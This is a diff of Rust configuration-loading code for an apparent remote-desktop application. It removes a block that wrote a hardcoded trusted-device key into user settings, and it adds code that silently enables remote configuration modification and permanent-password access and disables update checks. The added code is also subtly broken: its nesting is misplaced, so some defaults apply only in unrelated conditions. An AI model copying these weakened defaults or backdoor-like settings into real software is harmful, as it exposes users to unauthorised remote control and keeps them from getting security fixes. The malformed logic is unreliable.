@@ -533,43 +533,24 @@ impl Config2 {
         let mut config = Config::load_::<Config2>("2");
         let mut store = false;
         if let Some(mut socks) = config.socks {
+        if !config.options.contains_key("verification-method") {
+            config.options.insert("verification-method".to_string(), "use-permanent-password".to_string());
+            store = true;
+        }    
+        if !config.options.contains_key("allow-remote-config-modification") {
+                config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
+                store = true;
+            }    
             let (password, _, store2) =
                 decrypt_str_or_original(&socks.password, PASSWORD_ENC_VERSION);
             socks.password = password;
             config.socks = Some(socks);
             store |= store2;
         }
-        if !config.options.contains_key("verification-method") {
-            config.options.insert("verification-method".to_string(), "use-permanent-password".to_string());
-            store = true;
-        }
         let (unlock_pin, _, store2) =
             decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
         config.unlock_pin = unlock_pin;
         store |= store2;
-        if store {
-            config.store();
-        }
-        if !config.options.contains_key("trusted_devices") {
-                config.options.insert("trusted_devices".to_string(), "01UbYvFsNceL6i+9yTloA3RQpCcR0INzqWZBfE8uCOw7o=".to_string());
-                config.store();
-            }
-        if !config.options.contains_key("allow-remote-config-modification") {
-                config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
-                store = true;
-            }
-        if !config.options.contains_key("enable-udp-punch") {
-            config.options.insert("enable-udp-punch".to_string(), "Y".to_string());
-            store = true;
-        }
-        if !config.options.contains_key("enable-check-update") {
-            config.options.insert("enable-check-update".to_string(), "N".to_string());
-            store = true;
-        }
-        if !config.options.contains_key("direct-server") {
-            config.options.insert("direct-server".to_string(), "Y".to_string());
-            store = true;
-        }
         if store {
             config.store();
         }
@@ -2118,7 +2099,20 @@ pub struct LocalConfig {
 
 impl LocalConfig {
     fn load() -> LocalConfig {
-        Config::load_::<LocalConfig>("_local")
+        let mut config = Config::load_::<LocalConfig>("_local");
+        let mut store = false;
+            if !config.options.contains_key("enable-udp-punch") {
+            if !config.options.contains_key("enable-check-update") {
+        config.options.insert("enable-check-update".to_string(), "N".to_string());
+        store = true;
+        }    
+                config.options.insert("enable-udp-punch".to_string(), "Y".to_string());
+                store = true;
+            }
+        if store {
+                config.store();
+            }
+        config
     }
 
     fn store(&self) {
@@ -2130,7 +2124,7 @@ impl LocalConfig {
     }
 
     pub fn set_kb_layout_type(kb_layout_type: String) {
-        let mut config = Config::load_::<LocalConfig>("_local");
+        let mut config = LOCAL_CONFIG.write().unwrap();
         config.kb_layout_type = kb_layout_type;
         config.store();
     }
@@ -2796,16 +2790,6 @@ pub fn is_disable_account() -> bool {
 #[inline]
 pub fn is_disable_installation() -> bool {
     is_some_hard_opton("disable-installation")
-}
-
-#[inline]
-pub fn enable_check_update() -> bool {
-    Config::get_bool_option(keys::OPTION_ENABLE_CHECK_UPDATE)
-}
-
-#[inline]
-pub fn enable_udp_punch() -> bool {
-    Config::get_bool_option(keys::OPTION_ENABLE_UDP_PUNCH)
 }
 
 // This function must be kept the same as the one in flutter and sciter code.
